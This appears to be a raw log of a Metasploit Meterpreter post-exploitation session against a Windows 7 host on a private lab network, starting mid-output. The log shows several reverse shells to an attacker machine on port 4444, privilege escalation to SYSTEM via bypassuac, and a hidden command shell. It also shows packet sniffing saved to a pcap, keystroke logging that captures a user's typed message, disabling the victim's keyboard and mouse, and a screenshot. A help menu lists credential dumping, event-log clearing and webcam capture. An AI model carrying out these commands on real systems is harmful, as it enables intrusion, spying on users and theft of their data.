IPv6 Address : fe80::9e2:a98a:17f1:1b1a
IPv6 Netmask : ffff:ffff:ffff:ffff::


Interface 15
============
Name         : Microsoft ISATAP Adapter #2
Hardware MAC : 00:00:00:00:00:00
MTU          : 1280

meterpreter > route

IPv4 network routes
===================

    Subnet           Netmask          Gateway       Metric  Interface
    ------           -------          -------       ------  ---------
    0.0.0.0          0.0.0.0          192.168.1.1   10      11
    127.0.0.0        255.0.0.0        127.0.0.1     306     1
    127.0.0.1        255.255.255.255  127.0.0.1     306     1
    127.255.255.255  255.255.255.255  127.0.0.1     306     1
    192.168.1.0      255.255.255.0    192.168.1.14  266     11
    192.168.1.14     255.255.255.255  192.168.1.14  266     11
    192.168.1.255    255.255.255.255  192.168.1.14  266     11
    224.0.0.0        240.0.0.0        127.0.0.1     306     1
    224.0.0.0        240.0.0.0        192.168.1.14  266     11
    255.255.255.255  255.255.255.255  127.0.0.1     306     1
    255.255.255.255  255.255.255.255  192.168.1.14  266     11

No IPv6 routes were found.
meterpreter > netstat

Connection list
===============

    Proto  Local address                   Remote address      State        User  Inode  PID/Program name
    -----  -------------                   --------------      -----        ----  -----  ----------------
    tcp    0.0.0.0:80                      0.0.0.0:*           LISTEN       0     0      2276/badblue.exe
    tcp    0.0.0.0:135                     0.0.0.0:*           LISTEN       0     0      744/svchost.exe
    tcp    0.0.0.0:445                     0.0.0.0:*           LISTEN       0     0      4/System
    tcp    0.0.0.0:554                     0.0.0.0:*           LISTEN       0     0      3056/wmpnetwk.exe
    tcp    0.0.0.0:2869                    0.0.0.0:*           LISTEN       0     0      4/System
    tcp    0.0.0.0:3389                    0.0.0.0:*           LISTEN       0     0      1260/svchost.exe
    tcp    0.0.0.0:5357                    0.0.0.0:*           LISTEN       0     0      4/System
    tcp    0.0.0.0:10243                   0.0.0.0:*           LISTEN       0     0      4/System
    tcp    0.0.0.0:49152                   0.0.0.0:*           LISTEN       0     0      412/wininit.exe
    tcp    0.0.0.0:49153                   0.0.0.0:*           LISTEN       0     0      832/svchost.exe
    tcp    0.0.0.0:49154                   0.0.0.0:*           LISTEN       0     0      968/svchost.exe
    tcp    0.0.0.0:49155                   0.0.0.0:*           LISTEN       0     0      512/services.exe
    tcp    0.0.0.0:49156                   0.0.0.0:*           LISTEN       0     0      520/lsass.exe
    tcp    0.0.0.0:49157                   0.0.0.0:*           LISTEN       0     0      376/svchost.exe
    tcp    192.168.1.14:80                 192.168.1.13:43925  CLOSE_WAIT   0     0      2276/badblue.exe
    tcp    192.168.1.14:80                 192.168.1.13:44621  CLOSE_WAIT   0     0      2276/badblue.exe
    tcp    192.168.1.14:139                0.0.0.0:*           LISTEN       0     0      4/System
    tcp    192.168.1.14:49178              192.168.1.13:4444   ESTABLISHED  0     0      2276/badblue.exe
    tcp    192.168.1.14:49183              192.168.1.13:4444   ESTABLISHED  0     0      3244/YDjIsMekrTRqR.exe
    tcp    192.168.1.14:49200              192.168.1.13:4444   ESTABLISHED  0     0      3244/YDjIsMekrTRqR.exe
    tcp    192.168.1.14:49210              192.168.1.13:4444   ESTABLISHED  0     0      2276/badblue.exe
    tcp    192.168.1.14:49211              192.168.1.13:4444   ESTABLISHED  0     0      -
    tcp6   :::135                          :::*                LISTEN       0     0      744/svchost.exe
    tcp6   :::445                          :::*                LISTEN       0     0      4/System
    tcp6   :::554                          :::*                LISTEN       0     0      3056/wmpnetwk.exe
    tcp6   :::2869                         :::*                LISTEN       0     0      4/System
    tcp6   :::3389                         :::*                LISTEN       0     0      1260/svchost.exe
    tcp6   :::3587                         :::*                LISTEN       0     0      3348/svchost.exe
    tcp6   :::5357                         :::*                LISTEN       0     0      4/System
    tcp6   :::10243                        :::*                LISTEN       0     0      4/System
    tcp6   :::49152                        :::*                LISTEN       0     0      412/wininit.exe
    tcp6   :::49153                        :::*                LISTEN       0     0      832/svchost.exe
    tcp6   :::49154                        :::*                LISTEN       0     0      968/svchost.exe
    tcp6   :::49155                        :::*                LISTEN       0     0      512/services.exe
    tcp6   :::49156                        :::*                LISTEN       0     0      520/lsass.exe
    tcp6   :::49157                        :::*                LISTEN       0     0      376/svchost.exe
    udp    0.0.0.0:500                     0.0.0.0:*                        0     0      968/svchost.exe
    udp    0.0.0.0:3702                    0.0.0.0:*                        0     0      1532/svchost.exe
    udp    0.0.0.0:3702                    0.0.0.0:*                        0     0      1532/svchost.exe
    udp    0.0.0.0:3702                    0.0.0.0:*                        0     0      1124/svchost.exe
    udp    0.0.0.0:3702                    0.0.0.0:*                        0     0      1124/svchost.exe
    udp    0.0.0.0:4500                    0.0.0.0:*                        0     0      968/svchost.exe
    udp    0.0.0.0:5004                    0.0.0.0:*                        0     0      3056/wmpnetwk.exe
    udp    0.0.0.0:5005                    0.0.0.0:*                        0     0      3056/wmpnetwk.exe
    udp    0.0.0.0:5355                    0.0.0.0:*                        0     0      1260/svchost.exe
    udp    0.0.0.0:51670                   0.0.0.0:*                        0     0      1532/svchost.exe
    udp    0.0.0.0:55325                   0.0.0.0:*                        0     0      1124/svchost.exe
    udp    127.0.0.1:1900                  0.0.0.0:*                        0     0      1532/svchost.exe
    udp    127.0.0.1:57561                 0.0.0.0:*                        0     0      1532/svchost.exe
    udp    192.168.1.14:137                0.0.0.0:*                        0     0      4/System
    udp    192.168.1.14:138                0.0.0.0:*                        0     0      4/System
    udp    192.168.1.14:1900               0.0.0.0:*                        0     0      1532/svchost.exe
    udp    192.168.1.14:57560              0.0.0.0:*                        0     0      1532/svchost.exe
    udp6   :::500                          :::*                             0     0      968/svchost.exe
    udp6   :::3540                         :::*                             0     0      3348/svchost.exe
    udp6   :::3702                         :::*                             0     0      1532/svchost.exe
    udp6   :::3702                         :::*                             0     0      1124/svchost.exe
    udp6   :::3702                         :::*                             0     0      1124/svchost.exe
    udp6   :::3702                         :::*                             0     0      1532/svchost.exe
    udp6   :::4500                         :::*                             0     0      968/svchost.exe
    udp6   :::5004                         :::*                             0     0      3056/wmpnetwk.exe
    udp6   :::5005                         :::*                             0     0      3056/wmpnetwk.exe
    udp6   :::5355                         :::*                             0     0      1260/svchost.exe
    udp6   :::51671                        :::*                             0     0      1532/svchost.exe
    udp6   :::55326                        :::*                             0     0      1124/svchost.exe
    udp6   ::1:1900                        :::*                             0     0      1532/svchost.exe
    udp6   ::1:57559                       :::*                             0     0      1532/svchost.exe
    udp6   fe80::49a:c2ca:feba:24d8:1900   :::*                             0     0      1532/svchost.exe
    udp6   fe80::49a:c2ca:feba:24d8:57558  :::*                             0     0      1532/svchost.exe

meterpreter > execute -f cmd.exe -H -c -i
Process 2320 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>netstat -an
netstat -an

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:554            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:2869           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:5357           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:10243          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49156          0.0.0.0:0              LISTENING
  TCP    0.0.0.0:49157          0.0.0.0:0              LISTENING
  TCP    192.168.1.14:80        192.168.1.13:43925     CLOSE_WAIT
  TCP    192.168.1.14:80        192.168.1.13:44621     CLOSE_WAIT
  TCP    192.168.1.14:139       0.0.0.0:0              LISTENING
  TCP    192.168.1.14:49178     192.168.1.13:4444      ESTABLISHED
  TCP    192.168.1.14:49183     192.168.1.13:4444      ESTABLISHED
  TCP    192.168.1.14:49200     192.168.1.13:4444      ESTABLISHED
  TCP    192.168.1.14:49210     192.168.1.13:4444      ESTABLISHED
  TCP    192.168.1.14:49211     192.168.1.13:4444      ESTABLISHED
  TCP    [::]:135               [::]:0                 LISTENING
  TCP    [::]:445               [::]:0                 LISTENING
  TCP    [::]:554               [::]:0                 LISTENING
  TCP    [::]:2869              [::]:0                 LISTENING
  TCP    [::]:3389              [::]:0                 LISTENING
  TCP    [::]:3587              [::]:0                 LISTENING
  TCP    [::]:5357              [::]:0                 LISTENING
  TCP    [::]:10243             [::]:0                 LISTENING
  TCP    [::]:49152             [::]:0                 LISTENING
  TCP    [::]:49153             [::]:0                 LISTENING
  TCP    [::]:49154             [::]:0                 LISTENING
  TCP    [::]:49155             [::]:0                 LISTENING
  TCP    [::]:49156             [::]:0                 LISTENING
  TCP    [::]:49157             [::]:0                 LISTENING
  UDP    0.0.0.0:500            *:*
  UDP    0.0.0.0:3702           *:*
  UDP    0.0.0.0:3702           *:*
  UDP    0.0.0.0:3702           *:*
  UDP    0.0.0.0:3702           *:*
  UDP    0.0.0.0:4500           *:*
  UDP    0.0.0.0:5004           *:*
  UDP    0.0.0.0:5005           *:*
  UDP    0.0.0.0:5355           *:*
  UDP    0.0.0.0:51670          *:*
  UDP    0.0.0.0:55325          *:*
  UDP    127.0.0.1:1900         *:*
  UDP    127.0.0.1:57561        *:*
  UDP    192.168.1.14:137       *:*
  UDP    192.168.1.14:138       *:*
  UDP    192.168.1.14:1900      *:*
  UDP    192.168.1.14:57560     *:*
  UDP    [::]:500               *:*
  UDP    [::]:3540              *:*
  UDP    [::]:3702              *:*
  UDP    [::]:3702              *:*
  UDP    [::]:3702              *:*
  UDP    [::]:3702              *:*
  UDP    [::]:4500              *:*
  UDP    [::]:5004              *:*
  UDP    [::]:5005              *:*
  UDP    [::]:5355              *:*
  UDP    [::]:51671             *:*
  UDP    [::]:55326             *:*
  UDP    [::1]:1900             *:*
  UDP    [::1]:57559            *:*
  UDP    [fe80::49a:c2ca:feba:24d8%11]:1900  *:*
  UDP    [fe80::49a:c2ca:feba:24d8%11]:57558  *:*

C:\Windows\system32>exit
exit
meterpreter > use sniffer
Loading extension sniffer...success.
meterpreter > sniffer_interfaces

1 - 'WAN Miniport (Network Monitor)' ( type:3 mtu:1514 usable:true dhcp:false wifi:false )
2 - 'Intel(R) PRO/1000 MT Network Connection' ( type:0 mtu:1514 usable:true dhcp:true wifi:false )

meterpreter > sniffer_start 2 5000
[*] Capture started on interface 2 (5000 packet buffer)
meterpreter > sniffer_stats 2
[*] Capture statistics for interface 2
	packets: 95
	bytes: 27460
meterpreter > sniffer_stats 2
[*] Capture statistics for interface 2
	packets: 284
	bytes: 66604
meterpreter > sniffer_dump 2 remote.pcap
[*] Flushing packet capture buffer for interface 2...
[*] Flushed 344 packets (84831 bytes)
[*] Downloaded 100% (84831/84831)...
[*] Download completed, converting to PCAP...
[*] PCAP file written to remote.pcap
meterpreter > sniffer_stop 2
[*] Capture stopped on interface 2
[*] There are 37 packets (12027 bytes) remaining
[*] Download or release them using 'sniffer_dump' or 'sniffer_release'
meterpreter > sniffer_
sniffer_dump        sniffer_interfaces  sniffer_release     sniffer_start       sniffer_stats       sniffer_stop

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Windows Sessions, Stations and Desktops

Session
  single users logon session

Stations
  security boundary to contain desktops + processes

Desktops
  GUI objects allocated

msf exploit(bypassuac) > sessions -l

Active sessions
===============

  Id  Type                   Information                    Connection
  --  ----                   -----------                    ----------
  3   meterpreter x86/win32  ABCD-PC\ABCD @ ABCD-PC         192.168.1.13:4444 -> 192.168.1.14:49210 (192.168.1.14)
  4   meterpreter x86/win32  NT AUTHORITY\SYSTEM @ ABCD-PC  192.168.1.13:4444 -> 192.168.1.14:49211 (192.168.1.14)

msf exploit(bypassuac) > sessions -i 4
[*] Starting interaction with 4...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > getdesktop
Session 0\S\D
meterpreter > background
[*] Backgrounding session 4...
msf exploit(bypassuac) > sessions -i 3
[*] Starting interaction with 3...

meterpreter > getuid
Server username: ABCD-PC\ABCD
meterpreter > getdesktop
Session 1\W\D
meterpreter > use espia
Loading extension espia...success.
meterpreter > ?

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Drop into irb scripting mode
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session.
    transport                 Change the current transport mechanism
    use                       Deprecated alias for 'load'
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel


Stdapi: File system Commands
============================

    Command       Description
    -------       -----------
    cat           Read the contents of a file to the screen
    cd            Change directory
    dir           List files (alias for ls)
    download      Download a file or directory
    edit          Edit a file
    getlwd        Print local working directory
    getwd         Print working directory
    lcd           Change local working directory
    lpwd          Print local working directory
    ls            List files
    mkdir         Make directory
    mv            Move source to destination
    pwd           Print working directory
    rm            Delete the specified file
    rmdir         Remove directory
    search        Search for files
    show_mount    List all mount points/logical drives
    upload        Upload a file or directory


Stdapi: Networking Commands
===========================

    Command       Description
    -------       -----------
    arp           Display the host ARP cache
    getproxy      Display the current proxy configuration
    ifconfig      Display interfaces
    ipconfig      Display interfaces
    netstat       Display the network connections
    portfwd       Forward a local port to a remote service
    resolve       Resolve a set of host names on the target
    route         View and modify the routing table


Stdapi: System Commands
=======================

    Command       Description
    -------       -----------
    clearev       Clear the event log
    drop_token    Relinquishes any active impersonation token.
    execute       Execute a command
    getenv        Get one or more environment variable values
    getpid        Get the current process identifier
    getprivs      Attempt to enable all privileges available to the current process
    getsid        Get the SID of the user that the server is running as
    getuid        Get the user that the server is running as
    kill          Terminate a process
    ps            List running processes
    reboot        Reboots the remote computer
    reg           Modify and interact with the remote registry
    rev2self      Calls RevertToSelf() on the remote machine
    shell         Drop into a system command shell
    shutdown      Shuts down the remote computer
    steal_token   Attempts to steal an impersonation token from the target process
    suspend       Suspends or resumes a list of processes
    sysinfo       Gets information about the remote system, such as OS


Stdapi: User interface Commands
===============================

    Command        Description
    -------        -----------
    enumdesktops   List all accessible desktops and window stations
    getdesktop     Get the current meterpreter desktop
    idletime       Returns the number of seconds the remote user has been idle
    keyscan_dump   Dump the keystroke buffer
    keyscan_start  Start capturing keystrokes
    keyscan_stop   Stop capturing keystrokes
    screenshot     Grab a screenshot of the interactive desktop
    setdesktop     Change the meterpreters current desktop
    uictl          Control some of the user interface components


Stdapi: Webcam Commands
=======================

    Command        Description
    -------        -----------
    record_mic     Record audio from the default microphone for X seconds
    webcam_chat    Start a video chat
    webcam_list    List webcams
    webcam_snap    Take a snapshot from the specified webcam
    webcam_stream  Play a video stream from the specified webcam


Priv: Elevate Commands
======================

    Command       Description
    -------       -----------
    getsystem     Attempt to elevate your privilege to that of local system.


Priv: Password database Commands
================================

    Command       Description
    -------       -----------
    hashdump      Dumps the contents of the SAM database


Priv: Timestomp Commands
========================

    Command       Description
    -------       -----------
    timestomp     Manipulate file MACE attributes


Espia Commands
==============

    Command       Description
    -------       -----------
    screengrab    Attempt to grab screen shot from process's active desktop

meterpreter > enumdesktops
Enumerating all accessible desktops

Desktops
========

    Session  Station             Name
    -------  -------             ----
    1        WinSta0             Default
    1        Service-0x0-4d480$  sbox_alternate_desktop_0xE94

meterpreter > background
[*] Backgrounding session 3...
msf exploit(bypassuac) > sessions -l

Active sessions
===============

  Id  Type                   Information                    Connection
  --  ----                   -----------                    ----------
  3   meterpreter x86/win32  ABCD-PC\ABCD @ ABCD-PC         192.168.1.13:4444 -> 192.168.1.14:49210 (192.168.1.14)
  4   meterpreter x86/win32  NT AUTHORITY\SYSTEM @ ABCD-PC  192.168.1.13:4444 -> 192.168.1.14:49211 (192.168.1.14)

msf exploit(bypassuac) > sessions -i 4
[*] Starting interaction with 4...

meterpreter > enumdesktops
Enumerating all accessible desktops

Desktops
========

    Session  Station           Name
    -------  -------           ----
    0        WinSta0           Default
    0        WinSta0           Disconnect
    0        WinSta0           Winlogon
    0        msswindowstation  mssrestricteddesk

meterpreter > keyscan_start
Starting the keystroke sniffer...
meterpreter > keyscan_dump
Dumping captured keystrokes...
meterpreter > keyscan_stop
Stopping the keystroke sniffer...

meterpreter > background
[*] Backgrounding session 4...
msf exploit(bypassuac) > sessions -i 3
[*] Starting interaction with 3...

meterpreter > enumdesktops
Enumerating all accessible desktops

Desktops
========

    Session  Station             Name
    -------  -------             ----
    1        WinSta0             Default
    1        Service-0x0-4d480$  sbox_alternate_desktop_0xE94

meterpreter > keyscan_start
Starting the keystroke sniffer...
meterpreter > keyscan_dump
Dumping captured keystrokes...
 <Return> Thisi <Back>  is a secret message
meterpreter > keyscan_stop
Stopping the keystroke sniffer...

meterpreter > uictl
Usage: uictl [enable/disable] [keyboard/mouse/all]
meterpreter > uictl disable keyboard
Disabling keyboard...
meterpreter > uictl disable mouse
Disabling mouse...
meterpreter > uictl enable all
Enabling all...
meterpreter > screenshot
Screenshot saved to: /root/eHsuKFyb.jpeg
meterpreter >
